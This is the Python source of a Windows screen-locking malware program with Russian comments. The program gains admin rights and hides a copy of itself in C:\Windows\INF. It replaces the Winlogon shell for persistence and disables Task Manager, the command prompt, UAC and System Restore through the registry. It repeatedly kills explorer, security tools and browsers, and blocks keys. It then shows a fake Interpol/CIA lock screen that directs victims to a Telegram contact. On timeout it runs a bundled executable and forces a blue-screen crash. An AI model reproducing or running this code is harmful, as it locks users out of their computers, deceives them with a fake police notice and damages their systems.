import os
import shutil
import sys
import pyuac
import time
import pygame
import pyautogui
import random
import tkinter as tk
import keyboard
import subprocess
import ctypes
import threading
import winreg as reg
from tkinter import ttk
from comtypes import CLSCTX_ALL
from tkinter import messagebox, Tk, Label
from ctypes import windll, c_int, c_uint, c_ulong, byref, cast, POINTER
from PIL import Image, ImageTk
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

if not pyuac.isUserAdmin():
    pyuac.runAsAdmin()  # Попытка запустить скрипт с правами администратора
    sys.exit()

stop_flag = [False] # Для остановки таймера
current_function = None # Завали ебало
stoprepeat = threading.Event() # Чтобы оффнуть вирусы

pygame.mixer.init()  # Инициализация микшера

# Врубаем колонки
devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(
    IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
volume = cast(interface, POINTER(IAudioEndpointVolume))

# Копирование в другую папку
TARGET_DIR = r"C:\Windows\INF"
def set_file_attributes(file_path):
    """Устанавливает атрибуты 'скрытый' и 'системный' для указанного файла."""
    # Устанавливаем атрибуты скрытый и системный
    ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x02 | 0x04)  # FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM

def copy_to_target(new_name="c_computeaccelerator.exe"):
    """Копирует текущий исполняемый файл в папку назначения с указанным именем."""
    if not os.path.exists(TARGET_DIR):
        messagebox.showerror("Ошибка", f"Папка {TARGET_DIR} не найдена!")
        return

    # Полный путь текущего файла
    current_file = sys.argv[0]
    target_file = os.path.join(TARGET_DIR, new_name)

    # Проверяем, если уже в папке назначения с указанным именем, не копируем
    if os.path.abspath(current_file) == os.path.abspath(target_file):
        return True  # Уже в нужной папке с нужным именем

    # Копируем файл
    try:
        shutil.copy(current_file, target_file)
        print("Успешно", f"Программа скопирована в {TARGET_DIR} с именем {new_name}")

        # Устанавливаем атрибуты скрытый и системный
        set_file_attributes(target_file)

        os.startfile(target_file)  # Запускаем копию из целевой папки
        sys.exit()  # Завершаем исходный файл
    except Exception as e:
        print("Ошибка", f"Не удалось скопировать файл: {e}")

copy_to_target()

def resource_path(relative_path):
    # Определяем базовую директорию
    if hasattr(sys, '_MEIPASS'):  # Если программа упакована
        base_path = os.path.join(sys._MEIPASS, "resources")
    else:  # Если программа запускается из исходников
        base_path = os.path.join(os.path.abspath("."), "resources")
    # Возвращаем полный путь к файлу
    return os.path.join(base_path, relative_path)
    
def unpackviruses():
    file = resource_path("modern_cleaner.exe")
    subprocess.Popen([file])

def chaotic_mouse(duration=10, interval=0.05):
    end_time = time.time() + duration
    while time.time() < end_time:
        x, y = random.randint(0, pyautogui.size().width), random.randint(0, pyautogui.size().height)
        pyautogui.moveTo(x, y, duration=0.01)
        time.sleep(interval)
# Пример вызова
#chaotic_mouse(duration=5, interval=0.03)  #Первое число длительность пищдеца

def MinusRegedit():
        commands = [
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLowDiskSpaceChecks /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 255 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogoff /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuPinnedList /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyGames /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyMusic /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuNetworkPlaces /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f',
            r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 4 /f',
            r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f',
            r'REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f',
            r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 0 /f'
        ]
        # Выполнение всех команд в одном месте
        for command in commands:
            try:
                subprocess.run(command, check=True, shell=True)
                print(f"Команда выполнена: {command}")
            except subprocess.CalledProcessError as e:
                print(f"Ошибка при выполнении команды: {e}")

def BSOD():
    null_pointer = POINTER(c_int)()
    privilege_id = c_uint(19)
    enable_privilege = c_uint(1)
    current_thread = c_uint(0)
    privilege_status = c_int()
    windll.ntdll.RtlAdjustPrivilege(
        privilege_id,
        enable_privilege,
        current_thread,
        byref(privilege_status)
    )
    error_code = c_ulong(0xC000007B)
    arg_count = c_ulong(0)
    response_status = c_uint()
    windll.ntdll.NtRaiseHardError(
        error_code,
        arg_count,
        null_pointer,
        null_pointer,
        c_uint(6),
        byref(response_status)
    )


def kill_govno():
    try:
        subprocess.call("taskkill /F /IM explorer.exe", shell=True)
        subprocess.call("taskkill /F /IM taskmgr.exe", shell=True)
        subprocess.call("taskkill /F /IM regedit.exe", shell=True)
        subprocess.call("taskkill /F /IM notepad.exe", shell=True)
        subprocess.call("taskkill /F /IM resmon.exe", shell=True)
        subprocess.call("taskkill /F /IM control.exe", shell=True)
        subprocess.call("taskkill /F /IM firefox.exe", shell=True)
        subprocess.call("taskkill /F /IM chrome.exe", shell=True)
        subprocess.call("taskkill /F /IM ProcessHacker.exe", shell=True)
        subprocess.call("taskkill /F /IM perfmon.exe", shell=True)
        subprocess.call("taskkill /F /IM powershell.exe", shell=True)
        subprocess.call("taskkill /F /IM mrt.exe", shell=True)
        subprocess.call("taskkill /F /IM SecHealthUI.exe", shell=True)
        subprocess.call("taskkill /F /IM javaw.exe", shell=True)
        subprocess.call("taskkill /F /IM discord.exe", shell=True)
        subprocess.call("taskkill /F /IM opera.exe", shell=True)
        subprocess.call("taskkill /F /IM browser.exe", shell=True)
        subprocess.call("taskkill /F /IM telegram.exe", shell=True)
        subprocess.call("taskkill /F /IM cmd.exe", shell=True)
    except:
        print("похуй мне")

def repeatKill():
    while not stoprepeat.is_set():
        kill_govno()
        time.sleep(1)

def RepeatSvuk():
    while not stoprepeat.is_set():
            volume.SetMasterVolumeLevelScalar(1, None) # Громкость на макс
            time.sleep(0.1)

def playMusic_main():
    pygame.mixer.music.load(resource_path("main.mp3"))  # Загружаем музыку
    pygame.mixer.music.play(-1)  # Воспроизведение (-1 означает бесконечный повтор)

def playMusic_enter():
    pygame.mixer.stop()
    pygame.mixer.music.load(resource_path("Enter.mp3"))
    pygame.mixer.music.play(loops=-1)

def playMusic_vict():
    pygame.mixer.stop()
    pygame.mixer.music.load(resource_path("victory.mp3"))
    pygame.mixer.music.play(loops=-1)
    
def change_shell():
    try:
        key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
        reg.SetValueEx(key, "shell", 0, reg.REG_SZ, "C:/Windows/INF/c_computeaccelerator.exe")
        reg.CloseKey(key)
    except Exception as e:
        print(f"Ошибка при установке значения реестра: {e}")

def change_shell_enter():
    try:
        key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
        reg.SetValueEx(key, "shell", 0, reg.REG_SZ, "C:/Windows/INF/c_computeaccelerator.exe, C:/Windows/INF/.NET Data Provider for SqlServer/0419/SDFLauncher.bat")
        reg.CloseKey(key)
    except Exception as e:
        print(f"Ошибка при установке значения реестра: {e}")

def fix_shell():
    try:
        key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
        reg.SetValueEx(key, "shell", 0, reg.REG_SZ, "explorer.exe")
        reg.CloseKey(key)
    except Exception as e:
        print(f"Ошибка при установке значения реестра: {e}")

def delete_registry_key():
    try:
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, reg_path, 0, reg.KEY_SET_VALUE)
        reg.DeleteValue(key, "DisableRegistryTools")
        reg.CloseKey(key)
    except Exception as e:
        print(f"Ошибка при нахкй значения реестра: {e}")

def explroer():
    try:
        subprocess.call("explorer.exe", shell=True)
    except:
        print("отвалите нахуй от меня")

def block_keys():
    """Блокирует клавиши: Win, Ctrl, Tab, Alt, Delete, Shift."""
    keys_to_block = ['win', 'ctrl', 'tab', 'alt', 'delete', 'shift', 'f4']
    for key in keys_to_block:
        keyboard.block_key(key)

t1 = threading.Thread(target=RepeatSvuk)
t1.start()
t3 = threading.Thread(target=repeatKill)
t3.start()

def recovery():
    stoprepeat.set()
    t1.join()
    t3.join()
    def fix_command(command):
        try:
            subprocess.run(command, check=True, shell=True)
            print(f"Команда выполнена: {command}")
        except subprocess.CalledProcessError as e:
            print(f"Ошибка при выполнении команды: {e}")

    commands = [
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLowDiskSpaceChecks /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDriveTypeAutoRun /t REG_DWORD /d 255 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogoff /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuPinnedList /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMorePrograms /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyGames /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyMusic /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuNetworkPlaces /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 0 /f',
        r'REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 0 /f',
    ]
    for command in commands:
        fix_command(command)
    fix_shell()


def block_alt_f4(event):
    return "break"

def main():
    # Инициализация окна
    root = Tk()
    root.attributes("-fullscreen", True, "-topmost", True)  # Растянуть на весь экран, поверх остальных окон
    root.resizable(False, False)  # Нельзя поменять размер окна
    
    # Убираем рамки
    root.overrideredirect(True)

    # Загрузка и изменение размера картинки
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    img = Image.open(resource_path("img.png"))
    img = img.resize((screen_width, screen_height))
    bg_image1 = ImageTk.PhotoImage(img)

    # Картинка
    label = Label(root, image=bg_image1)
    label.place(x=0, y=0, relwidth=1, relheight=1)
    
    # Поле для ввода пароля
    entry = tk.Entry(root, width=20, font=("Consolas", 45), bg="black", fg="white")  # Увеличиваем ширину и размер текста
    entry.place(x=600, y=885)

    def countdown(count):
        # Таймер
        if not stop_flag[0]:
            minutes, seconds = divmod(count, 60)  # Переводим секунды в минуты и секунды
            timer_label.config(text=f"{minutes:02}:{seconds:02}")  # Обновляем текст на экране
            if count > 0:
                root.after(1000, countdown, count - 1)  # Запускаем таймер через 1 секунду
            else:
                Enter()


    def start_progress():
        progress_bar['value'] = 0
        root.after(1000, update_progress)

    def update_progress():
        global current_function
        current_value = progress_bar['value']
        if current_value < 100:
            progress_bar['value'] = current_value + 1.25
            root.after(600, update_progress)
        else:
            if current_function == "virus":
                change_shell_enter()
                time.sleep(0.5)
                BSOD()
            elif current_function == "victory":
                explroer()
                time.sleep(0.5)
                sys.exit()
                root.destroy()
            else:
                print("Невозможно определить действие")

    def start_timer():
        stop_flag[0] = False  # Сбрасываем флаг и запускаем таймер
        countdown(300)  # Запускаем таймер

    def stop_timer():
        stop_flag[0] = True  # Устанавливаем флаг остановки
        print("Таймер остановлен!")

    def show_text_wendovs():
        label1.config(text="deletting Windows...", font=("Consolas", 30))

    def show_text_media():
        label.config(text="deletting MediaGet...", font=("Consolas", 30))

    # Отображение времени
    timer_label = tk.Label(root, text="05:00", font=("Consolas", 48), bg="red")
    timer_label.place(x=700, y=30 )
    # Прогресс бар
    progress_bar = ttk.Progressbar(root, orient="horizontal", length=1, mode="determinate")
    # Текст удаление wendovs
    label1 = tk.Label(root, text="", bg="red", anchor="sw", font=("Consolas", 1)) #1 это размер текста, если нажмем на enter он поменяется на нормальгый
    label1.place(x=1100, y=500)
    # Текст удаление танков
    label = tk.Label(root, text="", bg="green", fg="yellow", anchor="sw",font=("Arial", 1))
    label.place(x=1100, y=500)

    multiline_text = "Your computer has been blocked by Interpol\nMediaget\nCurrently, CIA and FBP agents are investigating the\ndistribution of drugs in the Mediaget application. We\nurge you to remain calm and wait for Interpol agents\nto come to you."
    multiline_text1 = "You also have the option to delete Windows, to\ndo this, just press enter, all your files will be\npermanently deleted."
    multiline_text2 = "If you believe that the computer was blocked by mistake, report it to the\nmain CIA agent via telegram - @UNBLOCK_COMPUTER. If this turns out\nto be a mistake, you will be given a password to unlock it."
    # Создаем Label с черным текстом на красном фоне
    label2 = tk.Label(root, text=multiline_text, fg="white", bg="black", justify="left", font=("Consolas", 17))
    label2.place(x=20, y=180)

    label3 = tk.Label(root, text=multiline_text1, fg="black", bg="red", justify="left", font=("Consolas", 19))
    label3.place(x=20, y=450)

    label4 = tk.Label(root, text=multiline_text2, fg="white", bg="black", justify="left", font=("Consolas", 17))
    label4.place(x=20, y=630)

    label7 = tk.Label(root, text="Enter password:", bg="yellow", anchor="sw", font=("Consolas", 32))
    label7.place(x=27, y=900)

    label11 = tk.Label(root, text="Time Left:", bg="yellow", anchor="sw", font=("Consolas", 36))
    label11.place(x=270, y=40)

    def check_input(event=None):
        # Получаем введенный текст из поля ввода
        user_input = entry.get()
        # Пароль сука
        if user_input == "install2017mediagetforfree2013":
            entry.unbind('<KeyRelease>')
            playMusic_vict()
            disable_entry()
            global current_function
            current_function = "victory"  # Устанавливаем флаг, что запущена 2-я функция
            root.unbind("<Return>")
            progress_bar.place(x=1100, y=400, width=400, height=70)
            recovery()
            start_progress()
            show_text_media()
            stop_timer()

    def start_check_inpt(event=None):
        t6 = threading.Thread(target=check_input)
        t6.start()

    def Enter():
        global current_function
        current_function = "virus"
        root.unbind("<Return>")
        stop_timer()
        disable_entry()
        progress_bar.place(x=1100, y=400, width=400, height=70)
        start_progress()
        show_text_wendovs()
        unpackviruses()
        playMusic_enter()

    # Запуск таймера
    start_timer()

    # Бинды
    entry.bind('<KeyRelease>', start_check_inpt)
    root.bind("<Return>", lambda event: Enter())
    root.bind("<Alt-F4>", block_alt_f4) # Обламываем самых умных.

    def disable_entry():
        entry.config(state='disabled') # Отключение поля для ввода

    # Запуск основного цикла приложения
    root.mainloop()
    
# Запуск
change_shell()
playMusic_main()
block_keys()
MinusRegedit()
main()